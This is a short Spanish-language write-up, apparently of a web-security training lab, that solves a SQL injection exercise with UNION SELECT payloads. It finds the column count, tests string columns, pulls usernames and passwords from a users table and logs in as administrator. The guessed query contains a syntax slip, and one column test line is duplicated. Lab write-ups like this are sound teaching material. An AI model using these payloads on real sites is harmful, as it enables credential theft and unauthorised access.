## Objetivo:

![[Pasted image 20240622153304.png]]

## Solución:

Entramos a una categoria

![[Pasted image 20240622153346.png]]

Suponiendo que la query esta construida de esta manera
```
SELECT * FROM categories FROM category 'prueba';
```

### Haremos lo siguiente: 

* **Encontrar la cantidad de columnas devueltas** basandonos en el mensaje de error de "Internal Server Error". (Ya sea usando NULL u ORDER BY). En mi caso lo hice de la siguiente manera :
```
' UNION SELECT NULL, NULL--
```

![[Pasted image 20240622153701.png]]


* Encontrar que tipo de datos de esa columna se adecua a lo que queremos hacer (En este caso mostrar contraseñas y tal... Por lo tanto es lógico que el campo que queremos buscar sea de tipo string). Yo lo hice así:
```
' UNION SELECT 'a', NULL--
' UNION SELECT 'a', NULL--
```
Al parecer ambas columnas son string y se adecuan a lo que queremos

![[Pasted image 20240622154012.png]]

Ahora ya con esto haremos la inyeccion definitiva mostrando los datos de la columna "username" y "password" extrayendolos de la table users

```
' UNION SELECT username, password FROM users--
```

![[Pasted image 20240622154343.png]]

Iniciamos sesión con el usuario administrator y listo

![[Pasted image 20240622154410.png]]

